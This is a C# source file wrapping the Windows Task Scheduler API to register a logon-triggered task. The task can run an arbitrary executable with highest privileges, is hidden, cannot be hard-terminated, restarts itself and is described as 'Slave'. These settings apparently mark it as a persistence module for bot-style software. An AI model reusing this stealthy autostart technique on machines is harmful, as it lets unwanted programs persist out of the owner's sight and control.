using System;
using TaskScheduler;


namespace Classes
{
    /// <summary>
    /// Task Scheduler by QCX51
    /// </summary>
    class Taskschd
    {
        internal static string TaskGUID = new Guid("{AFBE18F4-641E-4533-A18C-33BE1757F1A3}").ToString();
        private static ITaskService taskService = new TaskScheduler.TaskScheduler();
        /// <summary>
        /// Task Scheduler by QCX51
        /// <href= "https://msdn.microsoft.com/en-us/library/windows/desktop/aa383608(v=vs.85).aspx"</href>
        /// </summary>
        /// <param name="TaskName">sets the task name</param>
        /// <param name="path">sets the path to an executable file.</param>
        /// <param name="arguments">sets the arguments associated with the command-line operation.</param>
        /// <param name="HighestLevel">if true, tasks will be run with the highest privileges otherwise tasks will be run with the least privileges.</param>
        /// <param name="StartTask">if true, runs the registered task immediately.</param>
        /// <param name="DelayTime">sets a value that indicates the amount of time in seconds between when the user logs on and when the task is started</param>
        /// <param name="ExecTimeLimit">sets the maximum amount of time in seconds that the task is allowed to run.</param>
        /// 
        internal static int CreateTask(string TaskName, string path, string arguments, bool HighestLevel, bool StartTask, int DelayTime, int ExecTimeLimit)
        {
            if (!taskService.Connected) { taskService.Connect(); }
            //create task service instance
            ITaskDefinition taskDefinition = taskService.NewTask(0);
            taskDefinition.RegistrationInfo.Author = string.Format("Copyright (C) QCX51 {0}", DateTime.Now.Year);
            //taskDefinition.RegistrationInfo.Date = DateTime.Now.ToShortDateString();
            taskDefinition.RegistrationInfo.Description = "Slave";
            // Set Settings
            ITaskSettings TaskSettings = taskDefinition.Settings;
            TaskSettings.Enabled = true;
            TaskSettings.AllowDemandStart = true;
            TaskSettings.Hidden = true;
            TaskSettings.StopIfGoingOnBatteries = false;
            TaskSettings.RunOnlyIfNetworkAvailable = false;
            TaskSettings.RunOnlyIfIdle = false;
            TaskSettings.AllowHardTerminate = false;
            TaskSettings.DisallowStartIfOnBatteries = false;
            TaskSettings.MultipleInstances = _TASK_INSTANCES_POLICY.TASK_INSTANCES_IGNORE_NEW;
            TaskSettings.StartWhenAvailable = true;
            TaskSettings.WakeToRun = true;
            TaskSettings.ExecutionTimeLimit = ExecTimeLimit > 0 ? "PT" + ExecTimeLimit + "S" : "PT0S";
            // PnYnMnDTnHnMnS P0Y0M0DT0H0M3S
            // PT5M specifies 5 minutes and P1M4DT2H5M specifies one month, four days, two hours, and five minutes.
            TaskSettings.DeleteExpiredTaskAfter = "";
            TaskSettings.RestartCount = 3;
            TaskSettings.RestartInterval = "PT5M";
            TaskSettings.Priority = 8; // 0-10 default: 7
            TaskSettings.Compatibility = _TASK_COMPATIBILITY.TASK_COMPATIBILITY_V2_1;

            IIdleSettings IdleSettings = TaskSettings.IdleSettings;
            IdleSettings.IdleDuration = "PT1M";
            IdleSettings.WaitTimeout = "PT3M";
            IdleSettings.RestartOnIdle = false;
            IdleSettings.StopOnIdleEnd = false;

            //create trigger for task creation.
            ITriggerCollection TriggerCollection = taskDefinition.Triggers;
            ILogonTrigger LogonTrigger = (ILogonTrigger)TriggerCollection.Create(_TASK_TRIGGER_TYPE2.TASK_TRIGGER_LOGON);
            LogonTrigger.Id = TaskGUID;
            //LogonTrigger.UserId = "SYSTEM";
            LogonTrigger.Repetition.StopAtDurationEnd = false;
            if (DelayTime > 0) LogonTrigger.Delay = "PT" + DelayTime + "S";
            //_trigger.StartBoundary = DateTime.Now.AddSeconds(15).ToString("yyyy'-'MM'-'dd'T'HH':'mm':'ss");
            //_trigger.EndBoundary = DateTime.Now.AddMinutes(1).ToString("yyyy'-'MM'-'dd'T'HH':'mm':'ss");
            if (ExecTimeLimit > 0) LogonTrigger.ExecutionTimeLimit = "PT" + ExecTimeLimit + "S";
            LogonTrigger.Enabled = true;

            IPrincipal Principal = taskDefinition.Principal;
            Principal.RunLevel = HighestLevel ? _TASK_RUNLEVEL.TASK_RUNLEVEL_HIGHEST : _TASK_RUNLEVEL.TASK_RUNLEVEL_LUA;
            Principal.Id = "Author";
            //Principal.UserId = "SYSTEM";
            //Principal.DisplayName = "SYSTEM";
            ///get actions.
            IActionCollection actions = taskDefinition.Actions;
            _TASK_ACTION_TYPE actionType = _TASK_ACTION_TYPE.TASK_ACTION_EXEC;
            //create new action
            IAction action = actions.Create(actionType);
            IExecAction execAction = action as IExecAction;
            execAction.WorkingDirectory = Environment.CurrentDirectory;
            execAction.Arguments = arguments;
            execAction.Path = path;
            ITaskFolder rootFolder = taskService.GetFolder(@"\");
            
            IRegisteredTask RegisteredTask = rootFolder.RegisterTaskDefinition(TaskName, taskDefinition, (int)_TASK_CREATION.TASK_CREATE_OR_UPDATE, null, null, _TASK_LOGON_TYPE.TASK_LOGON_NONE, null);
            if (StartTask) { RegisteredTask.Run(null); }
            return 0;
        }

        internal static bool TaskExists(string TaskName, string FileName, bool StartTask)
        {
            if (!taskService.Connected) { taskService.Connect(); }
            foreach (IRegisteredTask task in taskService.GetFolder(@"\").GetTasks((int)_TASK_ENUM_FLAGS.TASK_ENUM_HIDDEN))
            {
                foreach (IAction Action in task.Definition.Actions)
                {
                    
                    string FilePath = Action is IExecAction ? ((IExecAction)Action).Path : "";
                    if (TaskName == task.Name && FilePath.ToLower() == FileName && StartTask)
                    { task.Run(null) ; return true; }
                    if (TaskName == task.Name && FilePath.ToLower() == FileName)
                    { return true; }
                }
            } return false;
        }
    }
}
